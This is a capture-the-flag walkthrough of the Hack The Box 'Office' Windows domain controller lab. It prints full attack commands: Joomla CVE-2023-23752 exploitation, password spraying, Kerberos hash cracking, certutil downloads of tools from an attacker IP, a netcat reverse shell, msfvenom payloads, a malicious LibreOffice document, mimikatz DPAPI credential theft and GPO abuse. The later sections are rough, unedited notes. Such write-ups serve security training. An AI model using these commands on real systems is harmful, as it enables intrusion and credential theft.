---
title: HTB-Office
draft: false
tags:
  - htb
  - windows
  - hard
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/Office.png)

User Flag
Web DB Credential - Joomla. 4.2.7 -  CVE-2023-23752
Joomla Administrator web page bruteforce to reverse shell.
Earn user flag with tstark acc.

Root Flag
ppotts shell - Libre Vulnerability
hhogan shell - Vault Credential revealed
Administartor - SharpGPOAbuse to root


## Information Gathering
### Rustscan

Let's do full port scan with Rustscan:

`rustscan --addresses 10.10.11.3 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-6.png)

Based on the ports open, this machine seems to be a Domain Controller.

## Enumeration
### SMB - TCP 445

We will first enumerate smb with crackmapexec:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-1.png)

Crackmapexec find the domain name(**office.htb**). Let's add it to `/etc/hosts`.

Unfortunately, null login directory listing fails:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-2.png)

We would have to come back after we gain access to valid credentials. Let's move on. 

### RPC - TCP 135

We can try null login with **rpcclient**:

`rpcclient -U "" -N 10.10.11.3`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-3.png)

However, this is also access denied. 

### HTTPs - TCP 443

HTTPs is running on port 443 but the website is forbidden. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-4.png)



### HTTP - TCP 80

We can access the website running on HTTP. 

Website seems to be all about Tony Stark and Iron Man:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image.png)

It is a simple website that describes about the movie Iron man and the author is written as **Tony Stark**.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-5.png)

We would be able create custom wordlist using **Tony Stark** username later on when we Kerbrute or AS-REP Roast on the domain.

Let's see if there are any interesting hidden directories:

`feroxbuster -u http://office.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-9.png)

Feroxbuster finds tons of new directories and `/Administrator` stands out.

`/administrator` is a login portal for Jooma Administrator:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-10.png)

And yes, CMS for this website is **Joomla**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/of-wap.png)

Based on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version), let's check out Joomla's version:

`/administrator/manifests/files/joomla.xml`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-7.png)

We can successfully identify the version: **4.2.7**

## User dwolfe Pwn
### CVE-2023-23752

Googling on known exploits regarding Joomla 4.2.7, it seems like **CVE-2023-23752** is vulnerable to it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-8.png)

Let's download the exploit from [here](https://github.com/Acceis/exploit-CVE-2023-23752).

Running the exploit towards the website, it throws back up with mysql password: **H0lOgrams4reTakIng0Ver754!**

`ruby exploit.rb http://office.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-11.png)

It has also discovered new domain(**holography.htb**), which we add to `/etc/hosts`.

We have tried using this credentials for both the website and towards services on the domain but it was working. 

We would have to discover more users and try spraying passwords on those users. 

### Kerbrute

Let's create a custom wordlist containing common usernames along with possible username variaion for the user **Tony Stark**. 

We will run Kerbrute with out custon userlist:

`./kerbrute_linux_amd64 userenum -d office.htb --dc 10.10.11.3 ~/Documents/htb/office/users.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-18.png)

Kerbrute find several users on the domain, inclusing **tstark**. 

### Password Spraying

Now that we have list of valid users, let's spray the password on those users using crackmapexec:

`crackmapexec smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-12.png)

We get valid match for user **dwolfe**.

## User tstark Pwn
### SMB Access

Now that we can access smb using credentials for **dwolfe**, let's see what shares are there:

`crackmapexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-14.png)

Among the shares where dwolfe has the read permission to, **SOC Analysis** shares looks the most interesting. 

Let's download the file **Latest-System-Dump-8fbc124d.pcap** using smbclient:

`sudo smbclient '//10.10.11.3/Soc Analysis' -U dwolfe%'H0lOgrams4reTakIng0Ver754!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-15.png)

### Wireshark

Now that we have downloaded the pcap file, let's open it with **Wireshark** and enumerate it. 

Since we are enumerating Domain Controller machine, let's filter for **Kerberos**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-16.png)

There are two AS-REQ records found. 

Taking a closer look at the second AS-REQ, there is a password hash that was used when authenticating:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-17.png)

Based on [this article](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/), let's attempt to crack this hash. 

We will first format the hash as such with the potential username(tstark), domain name(office.htb), and the hash:

```
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

Now using hashcat, we should be able to crack the hash:

`hashcat -m 19900 hash ~/Downloads/rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/of-hash.png)


Hash is cracked successfully and we obtained the credentials for 
**tstark**:**playboy69**


## Shell as web_account
### Joomla RCE

We have tried login to administrator portal using the credentials as tstark but it didn't work. 

Let's try the passowrd for tstark with the username of **administrator**, since **Tony Stark** user seemed to be an admin on the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-13.png)

Luckily, login was successful and we now have access to the dashboard:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-19.png)

Doing some research, it seems like Joomla is vulnerable to [RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce)


System -> Templates

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-20.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-21.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-22.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-23.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-24.png)

```powershell
powershell -e <snip>>
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-25.png)

fckk


certutil.exe -urlcache -split -f http://10.10.14.36:8000/nc.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-27.png)

.\nc.exe -e cmd.exe 10.10.14.36 1337


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-28.png)





## Privesc: web_account to tstark
### RunasCS
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-26.png)



impacket-smbserver share -smb2support $(pwd)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-29.png)

python3 -m http.server

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-30.png)


[here](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Solarlab#runascsexe)

.\RunasCs.exe tstark playboy69 "whoami"

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-31.png)


.\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.36:1338

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-32.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-33.png)

## Privesc: tstark to hhogan
### Local Enumeration

netstat -ano

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-34.png)

### Chisel

certutil.exe -urlcache -split -f http://10.10.14.36:8000/chisel_windows.exe


chisel server -p 9999 --reverse

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-35.png)

.\chisel_windows.exe client 10.10.14.36:9999 R:8083:127.0.0.1:8083

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-36.png)

http://127.0.0.1:8083/

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-37.png)

### CVE-2023-2255

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-38.png)


http://127.0.0.1:8083/resume.php

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-39.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-40.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-41.png)

https://github.com/elweth-sec/CVE-2023-2255/blob/main/README.md


sudo python3 cve-2023-2255.py --cmd webshell.php --output 'exploit.odt'



`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o shell.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-44.png)


I generated a malicious file designed for reverse shell execution with the .odt extension, leveraging the exploit “CVE-2023-2255.” Subsequently, I uploaded this file onto the same web server, intending to exploit the vulnerability and gain remote access to the system.





sudo python3 cve-2023-2255.py --cmd 'C:\programdata\shell.exe' --output 'exploit.odt'



![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-46.png)
fuck
`sudo python3 cve-2023-2255.py --cmd 'C:/xampp/htdocs/joomla/templates/cassiopeia/a.exe' --output 'exploit.odt'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-47.png)




real

sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9001 -f exe -o shell.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-42.png)

sudo python3 cve-2023-2255.py --cmd 'C:\Users\Public\shell.exe' --output 'exploit-run.odt'

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-43.png)

certutil.exe -urlcache -split -f http://10.10.14.36:1235/shell.exe

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-45.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-48.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-50.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-49.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-51.png)

## Privesc: ppotts to administrator
### winPEAS

certutil.exe -urlcache -split -f http://10.10.14.36:1236/jaws-enum.ps1

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-52.png)

./jaws-enum.ps1

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-53.png)

`cmdkey /list`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-54.png)

https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Access#privesc-security-to-administrator

https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-55.png)

```bash
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
-a-hs-          6/3/2024   6:47 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E    
```


certutil.exe -urlcache -split -f http://10.10.14.36:1236/mimikatz.exe


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-56.png)

dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-57.png)

dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\18A1927A997A794B65E9849883AC3F3E

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-58.png)

dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\E76CCA3670CD9BB98DF79E0A8D176F1E

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-59.png)

PS C:\users\ppotts\appdata\roaming\Microsoft\Protect> dir

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-60.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-61.png)


PS C:\users\ppotts\appdata\roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107> gci -force
gci -force


    Directory: C:\users\ppotts\appdata\roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d                                 
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb                                 
-a-hs-          6/2/2024   2:27 PM            740 b79e2c88-a4f1-4c75-aefe-7649c9998026                                 
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE                    



dpapi::masterkey /in:C:\\users\ppotts\appdata\roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-62.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-63.png)


dpapi::cred /in:C:\users\ppotts\appdata\roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-64.png)

H4ppyFtW183#

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-65.png)


## Privesc: HHogan to System

`whoami /all`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-66.png)

Get-GPO -All | Select-Object -ExpandProperty DisplayName

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-67.png)

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#sharpgpoabuse-abuse-gpo


https://github.com/byronkg/SharpGPOAbuse


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-68.png)



`./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Policy"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-69.png)

gpupdate /force

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-70.png)

net localgroup Administrators

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-71.png)










## References
- https://github.com/Acceis/exploit-CVE-2023-23752
- https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a
- https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Solarlab#runascsexe
- https://github.com/elweth-sec/CVE-2023-2255/blob/main/README.md
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Access#privesc-security-to-administrator
- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#sharpgpoabuse-abuse-gpo
- https://github.com/byronkg/SharpGPOAbuse